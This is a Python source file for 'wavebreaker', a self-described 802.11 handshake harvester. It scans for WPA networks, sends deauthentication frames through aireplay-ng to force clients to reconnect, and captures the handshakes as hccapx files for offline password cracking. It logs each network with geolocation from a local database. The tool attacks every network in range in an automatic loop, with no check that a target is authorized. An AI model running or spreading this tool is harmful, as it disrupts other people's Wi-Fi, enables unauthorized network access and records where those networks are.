#!/usr/bin/env python3

import os
import sys
import re
import signal
import subprocess
import shutil
import time
import csv
import struct
import threading
import logging
import hashlib
import hmac
import ipaddress
import socket
import stat
from pathlib import Path
from typing import Optional
from datetime import datetime, timezone

__version__ = "1.0.0"
__tool__ = "wavebreaker"

logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)]
)
logger = logging.getLogger(__tool__)

RED    = "\033[0;31m"
LBLUE  = "\033[1;34m"
GREEN  = "\033[0;32m"
YELLOW = "\033[1;33m"
ORANGE = "\033[0;33m"
CYAN   = "\033[0;36m"
BOLD   = "\033[1m"
NC     = "\033[0m"

CONF_DIR       = Path("/etc/wavebreaker")
CONF_FILE      = CONF_DIR / "wavebreaker.conf"
DB_FILE        = Path("/usr/share/wavebreaker/db")
HANDSHAKE_DIR  = Path("/usr/share/wavebreaker/handshakes")
TMP_DIR        = Path("/tmp/wb_")
LOG_FILE       = Path("/var/log/wavebreaker.log")

BSSID_RE       = re.compile(r"^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$")
ESSID_RE       = re.compile(r"^[\w\s\-\.@#!$%^&*()+=\[\]{}|\\:;<>,?/~`]{1,32}$")
CHANNEL_RE     = re.compile(r"^(?:[1-9]|1[0-3]|3[6-9]|4[0-9]|5[0-2]|56|60|64|100|104|108|112|116|120|124|128|132|136|140|144|149|153|157|161|165)$")
IFACE_RE       = re.compile(r"^[a-zA-Z0-9_]{1,16}$")

_spinner_active = False
_spinner_thread: Optional[threading.Thread] = None
_spinner_lock   = threading.Lock()

hs_count   = 0
_exit_event = threading.Event()


def _audit_log(action: str, detail: str) -> None:
    ts = datetime.now(timezone.utc).isoformat()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{ts} | {action} | {detail}\n")
    except OSError:
        pass


def _safe_path(base: Path, name: str) -> Path:
    base   = base.resolve()
    target = (base / name).resolve()
    if not str(target).startswith(str(base)):
        raise ValueError(f"Path traversal detected: {name!r}")
    return target


def _validate_bssid(bssid: str) -> str:
    bssid = bssid.strip().upper()
    if not BSSID_RE.match(bssid):
        raise ValueError(f"Invalid BSSID: {bssid!r}")
    return bssid


def _validate_essid(essid: str) -> str:
    essid = essid.strip()
    if len(essid) == 0 or len(essid) > 32:
        raise ValueError(f"ESSID length out of range: {len(essid)}")
    if not ESSID_RE.match(essid):
        raise ValueError(f"ESSID contains illegal characters: {essid!r}")
    return essid


def _validate_channel(channel: str) -> str:
    channel = channel.strip()
    if not CHANNEL_RE.match(channel):
        raise ValueError(f"Invalid channel: {channel!r}")
    return channel


def _validate_interface(iface: str) -> str:
    iface = iface.strip()
    if not IFACE_RE.match(iface):
        raise ValueError(f"Illegal interface name: {iface!r}")
    if not Path(f"/sys/class/net/{iface}").exists():
        raise ValueError(f"Interface not found: {iface!r}")
    return iface


def _read_conf() -> dict:
    result = {}
    if not CONF_FILE.exists():
        return result
    try:
        with CONF_FILE.open("r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" not in line:
                    continue
                key, _, val = line.partition("=")
                key = key.strip().lower()
                val = val.strip()
                if key in ("interface", "ignore"):
                    result[key] = val
    except OSError as e:
        logger.error("Cannot read config: %s", e)
    return result


def _write_conf(data: dict) -> None:
    CONF_DIR.mkdir(parents=True, exist_ok=True)
    CONF_FILE.parent.mkdir(parents=True, exist_ok=True)
    tmp = CONF_FILE.with_suffix(".tmp")
    try:
        with tmp.open("w") as f:
            for k, v in data.items():
                f.write(f"{k}={v}\n")
        tmp.replace(CONF_FILE)
        CONF_FILE.chmod(0o600)
    except OSError as e:
        logger.error("Cannot write config: %s", e)
        tmp.unlink(missing_ok=True)
        raise


def _db_contains(bssid: str) -> bool:
    if not DB_FILE.exists():
        return False
    try:
        with DB_FILE.open("r") as f:
            for line in f:
                parts = line.strip().split(",")
                if parts and parts[0].upper() == bssid.upper():
                    return True
    except OSError:
        pass
    return False


def _db_append(record: str) -> None:
    DB_FILE.parent.mkdir(parents=True, exist_ok=True)
    safe_record = record.replace("\n", "").replace("\r", "")
    try:
        with DB_FILE.open("a") as f:
            f.write(safe_record + "\n")
        DB_FILE.chmod(0o600)
    except OSError as e:
        logger.error("Cannot write to DB: %s", e)


def _is_root() -> bool:
    if hasattr(os, "geteuid"):
        return os.geteuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _require_root() -> None:
    if not _is_root():
        print(f"{RED}[-] Root/Administrator privileges required. Exiting.{NC}")
        sys.exit(1)


def _check_dependency(cmd: str) -> bool:
    return shutil.which(cmd) is not None


REQUIRED_BINS = ["aireplay-ng", "airodump-ng", "cap2hccapx", "wlanhcxinfo", "iwconfig"]

def _check_all_dependencies() -> bool:
    missing = [b for b in REQUIRED_BINS if not _check_dependency(b)]
    if missing:
        print(f"{YELLOW}[!] Missing required binaries: {', '.join(missing)}{NC}")
        return False
    return True


def _run(cmd: list, timeout: int = 30, capture: bool = True) -> subprocess.CompletedProcess:
    for arg in cmd:
        if not isinstance(arg, str):
            raise TypeError(f"Command argument must be str, got {type(arg)}")
        if any(c in arg for c in ["\n", "\r", "\x00"]):
            raise ValueError(f"Illegal character in command argument: {arg!r}")
    try:
        return subprocess.run(
            cmd,
            timeout=timeout,
            capture_output=capture,
            text=True,
        )
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, returncode=124, stdout="", stderr="TIMEOUT")
    except FileNotFoundError:
        return subprocess.CompletedProcess(cmd, returncode=127, stdout="", stderr=f"NOT FOUND: {cmd[0]}")


def _popen(cmd: list) -> subprocess.Popen:
    for arg in cmd:
        if not isinstance(arg, str):
            raise TypeError(f"Command argument must be str, got {type(arg)}")
        if any(c in arg for c in ["\n", "\r", "\x00"]):
            raise ValueError(f"Illegal character in command argument: {arg!r}")
    return subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _spinner(stop_event: threading.Event) -> None:
    frames = ["/", "-", "\\", "|"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r{YELLOW}{frames[i % 4]}{NC}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)


def _start_spinner() -> threading.Event:
    stop = threading.Event()
    t = threading.Thread(target=_spinner, args=(stop,), daemon=True)
    t.start()
    return stop


def _stop_spinner(stop: threading.Event) -> None:
    stop.set()
    time.sleep(0.15)
    sys.stdout.write("\r  \r")
    sys.stdout.flush()


def _cleanup_tmp() -> None:
    import glob
    for p in glob.glob("/tmp/wb_*"):
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            else:
                os.unlink(p)
        except OSError:
            pass


def _ctrl_c(signum, frame) -> None:
    global hs_count
    print(f"\n\r{YELLOW}[*] Keyboard Interrupt{NC}")
    print(f"\r{LBLUE}[*] Handshakes captured this session: {hs_count}{NC}")
    _cleanup_tmp()
    _exit_event.set()
    sys.exit(0)


signal.signal(signal.SIGINT, _ctrl_c)
signal.signal(signal.SIGTERM, _ctrl_c)


def banner() -> None:
    lines = [
        r" _       _  ___   _   _  _____  _____  ____   _____   ___   _  _____  _____  ",
        r"| |     | |/ _ \ | | | || ____|| ____||  _ \ | ____| / _ \ | |/ ____|| ____|",
        r"| |  _  | || |_| || | | || |__  | |__  | |_) || |__  | |_| || || (___  | |__  ",
        r"| | | | | ||  _  || | | ||  __| |  __| |  _ < |  __| |  _  || | \___ \ |  __| ",
        r"| |_| |_| || | | || |_| || |___  | |___ | |_) || |___ | | | || |  ___) || |___ ",
        r"|_________||_| |_| \___/ |_____| |_____||____/ |_____||_| |_||_| |____/ |_____|",
    ]
    print(f"{RED}")
    for line in lines:
        print(line)
        time.sleep(0.15)
    print(f"\n{NC}{CYAN}{BOLD}  wavebreaker v{__version__} — 802.11 handshake harvester{NC}\n")


def _test_injection(interface: str) -> bool:
    try:
        iface = _validate_interface(interface)
    except ValueError:
        return False
    result = _run(["aireplay-ng", "--test", iface], timeout=20)
    return "Injection is working" in (result.stdout + result.stderr)


def _set_channel(interface: str, channel: str) -> None:
    iface   = _validate_interface(interface)
    channel = _validate_channel(channel)
    _run(["iwconfig", iface, "channel", channel], timeout=5)


def _parse_airodump_csv(csv_path: Path) -> list[dict]:
    stations = []
    if not csv_path.exists():
        return stations
    try:
        with csv_path.open("r", errors="replace") as f:
            content = f.read()
        ap_section = content.split("\r\n\r\n")[0] if "\r\n\r\n" in content else content
        reader = csv.reader(ap_section.splitlines())
        header_found = False
        for row in reader:
            if not row:
                continue
            if not header_found:
                if row[0].strip().upper() == "BSSID":
                    header_found = True
                continue
            if len(row) < 14:
                continue
            try:
                bssid   = _validate_bssid(row[0].strip())
                channel = _validate_channel(row[3].strip())
                essid   = _validate_essid(row[13].strip())
                stations.append({"bssid": bssid, "essid": essid, "channel": channel})
            except ValueError:
                continue
    except (OSError, UnicodeDecodeError):
        pass
    return stations


def _verify_hccapx(path: Path) -> bool:
    if not path.exists() or path.stat().st_size < 4:
        return False
    try:
        with path.open("rb") as f:
            magic = f.read(4)
        return magic == b"HCPX"
    except OSError:
        return False


def _is_valid_handshake(path: Path) -> bool:
    if not _verify_hccapx(path):
        return False
    result = _run(["wlanhcxinfo", "-i", str(path)], timeout=10)
    combined = result.stdout + result.stderr
    if "0 records loaded" in combined:
        return False
    if result.returncode != 0 and "0 records loaded" not in combined:
        return False
    return True


def _geolocate_bssid_local(bssid: str) -> Optional[dict]:
    db_paths = [
        Path("/usr/share/wavebreaker/geoip/wigle.db"),
        Path("/var/lib/wavebreaker/wifi_geo.db"),
    ]
    for dbp in db_paths:
        if dbp.exists():
            try:
                import sqlite3
                with sqlite3.connect(str(dbp)) as con:
                    cur = con.execute(
                        "SELECT lat, lon, accuracy FROM wifi WHERE bssid=? LIMIT 1",
                        (bssid.upper(),),
                    )
                    row = cur.fetchone()
                    if row:
                        return {"lat": row[0], "lon": row[1], "accuracy": row[2]}
            except Exception:
                pass
    return None


def hc_setup() -> None:
    _require_root()
    banner()
    print("[*] Starting wavebreaker setup")

    data_exists = (
        CONF_FILE.exists() and CONF_FILE.stat().st_size > 0
        or DB_FILE.exists() and DB_FILE.stat().st_size > 0
        or (HANDSHAKE_DIR.exists() and any(HANDSHAKE_DIR.iterdir()))
    )

    if data_exists:
        print(f"{RED}[!] WARNING: Continuing will erase existing config, DB, and handshakes. Back up first.{NC}")
        flag = input("[!] Proceed? [y/N]: ").strip().lower() or "n"
        if flag != "y":
            print("[*] Exiting.")
            sys.exit(0)

    for d in [CONF_DIR, DB_FILE.parent, HANDSHAKE_DIR]:
        d.mkdir(parents=True, exist_ok=True)
        d.chmod(0o700)

    CONF_FILE.write_text("")
    CONF_FILE.chmod(0o600)
    DB_FILE.write_text("")
    DB_FILE.chmod(0o600)

    if HANDSHAKE_DIR.exists():
        shutil.rmtree(HANDSHAKE_DIR)
    HANDSHAKE_DIR.mkdir(parents=True)
    HANDSHAKE_DIR.chmod(0o700)

    if not _check_all_dependencies():
        print(f"{YELLOW}[!] Install missing binaries before running wavebreaker.{NC}")

    while True:
        raw_iface = input("[*] Enter your wireless interface: ").strip()
        try:
            iface = _validate_interface(raw_iface)
        except ValueError as e:
            print(f"{YELLOW}[-] {e}{NC}")
            continue
        print("[*] Testing monitor mode / injection capability…")
        if _test_injection(iface):
            print(f"{GREEN}[+] Adapter is operational in monitor mode!{NC}")
            break
        print(f"{YELLOW}[-] Injection test failed for {iface!r}.{NC}")

    _write_conf({"interface": iface})
    _audit_log("SETUP", f"interface={iface}")
    print("[*] Setup complete.")


def hc_help() -> None:
    banner()
    print("Usage:")
    print(f"  sudo python3 {__file__}")
    print("\nArguments:")
    print(f"  --setup   Run first-time setup")
    print(f"  --help    Show this help screen\n")


def hc_run() -> None:
    global hs_count
    _require_root()

    if not CONF_FILE.exists() or not DB_FILE.exists() or not HANDSHAKE_DIR.exists():
        print(f"{RED}[-] Essential files missing. Run with --setup first.{NC}")
        sys.exit(1)

    if not _check_all_dependencies():
        sys.exit(1)

    conf = _read_conf()
    interface = conf.get("interface", "").strip()

    try:
        interface = _validate_interface(interface)
    except ValueError as e:
        print(f"{RED}[-] Invalid interface in config: {e}{NC}")
        sys.exit(1)

    if not _test_injection(interface):
        print(f"{RED}[-] Monitor mode unavailable on {interface!r}. Re-run --setup.{NC}")
        sys.exit(1)

    ignore_list = [s.strip() for s in conf.get("ignore", "").split(",") if s.strip()]

    banner()
    _cleanup_tmp()

    cap_tmp = Path("/tmp/wb_captures")
    hs_tmp  = Path("/tmp/wb_handshakes")
    cap_tmp.mkdir(exist_ok=True)
    cap_tmp.chmod(0o700)
    hs_tmp.mkdir(exist_ok=True)
    hs_tmp.chmod(0o700)

    print(f"\n\n\n")

    while not _exit_event.is_set():
        ap_count = 0

        _move_up(3)
        _clear_line()
        sys.stdout.write(f"\rStatus: {YELLOW}Scanning for WiFi networks{NC}  ")
        sys.stdout.flush()

        scan_out = Path("/tmp/wb_scan")
        stop = _start_spinner()
        _run(
            ["airodump-ng", interface, "-t", "wpa", "-w", str(scan_out), "--output-format", "csv"],
            timeout=3,
            capture=True,
        )
        _stop_spinner(stop)

        csv_candidates = list(Path("/tmp").glob("wb_scan-*.csv"))
        stations: list[dict] = []
        for c in csv_candidates:
            stations.extend(_parse_airodump_csv(c))
            try:
                c.unlink()
            except OSError:
                pass

        for station in stations:
            bssid   = station["bssid"]
            essid   = station["essid"]
            channel = station["channel"]

            if essid in ignore_list:
                continue
            if _db_contains(bssid):
                continue

            ap_count += 1

            _move_up(2)
            _clear_line()
            sys.stdout.write(f"\rAccess Point: {YELLOW}{essid}{NC}")
            _move_down(2)
            _move_up(3)
            _clear_line()
            sys.stdout.write(f"\rStatus: {YELLOW}Deauthenticating clients{NC}  ")
            _move_down(3)
            sys.stdout.write("\r")
            sys.stdout.flush()

            try:
                _set_channel(interface, channel)
            except ValueError:
                continue

            deauth_proc = _popen(["aireplay-ng", "--deauth", "5", "-a", bssid, interface])
            time.sleep(1)

            _move_up(3)
            _clear_line()
            sys.stdout.write(f"\rStatus: {YELLOW}Listening for handshake{NC}  ")
            _move_down(3)
            sys.stdout.write("\r")
            sys.stdout.flush()

            cap_base  = _safe_path(cap_tmp, bssid.replace(":", "-"))
            cap_file  = cap_tmp / f"{bssid.replace(':', '-')}-01.cap"
            hccapx_f  = _safe_path(hs_tmp, f"{bssid.replace(':', '-')}.hccapx")

            stop = _start_spinner()
            _run(
                [
                    "airodump-ng",
                    "-w", str(cap_base),
                    "--output-format", "pcap",
                    "--bssid", bssid,
                    "--channel", channel,
                    interface,
                ],
                timeout=10,
                capture=True,
            )
            _stop_spinner(stop)

            try:
                deauth_proc.terminate()
            except Exception:
                pass

            if not cap_file.exists():
                continue

            conv = _run(["cap2hccapx", str(cap_file), str(hccapx_f)], timeout=15)

            if cap_file.exists():
                cap_file.unlink(missing_ok=True)

            if not _is_valid_handshake(hccapx_f):
                hccapx_f.unlink(missing_ok=True)
                continue

            dest = _safe_path(HANDSHAKE_DIR, f"{bssid.replace(':', '-')}.hccapx")
            shutil.copy2(str(hccapx_f), str(dest))
            dest.chmod(0o600)
            hs_count += 1

            _audit_log("HANDSHAKE", f"bssid={bssid} essid={essid}")

            geo = _geolocate_bssid_local(bssid)
            if geo:
                record = f"{bssid},{essid},{geo['lat']},{geo['lon']},{geo.get('accuracy','')}"
            else:
                record = f"{bssid},{essid}"
            _db_append(record)

        _move_up(1)
        _clear_line()
        if ap_count == 0:
            captured = len(list(hs_tmp.glob("*.hccapx")))
            sys.stdout.write(f"\rLast scan: {YELLOW}No new targets found{NC}  ")
        else:
            sys.stdout.write(f"\rLast scan: {YELLOW}{ap_count} APs processed | {hs_count} total handshakes{NC}  ")
        _move_down(1)
        sys.stdout.write("\r")
        sys.stdout.flush()

        time.sleep(1)


def _move_up(n: int) -> None:
    sys.stdout.write(f"\033[{n}A")


def _move_down(n: int) -> None:
    sys.stdout.write(f"\033[{n}B")


def _clear_line() -> None:
    sys.stdout.write("\033[2K")


def main() -> None:
    if len(sys.argv) > 2:
        hc_help()
        sys.exit(1)

    arg = sys.argv[1] if len(sys.argv) == 2 else ""

    if arg == "--help":
        hc_help()
    elif arg == "--setup":
        hc_setup()
    elif arg == "":
        hc_run()
    else:
        hc_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
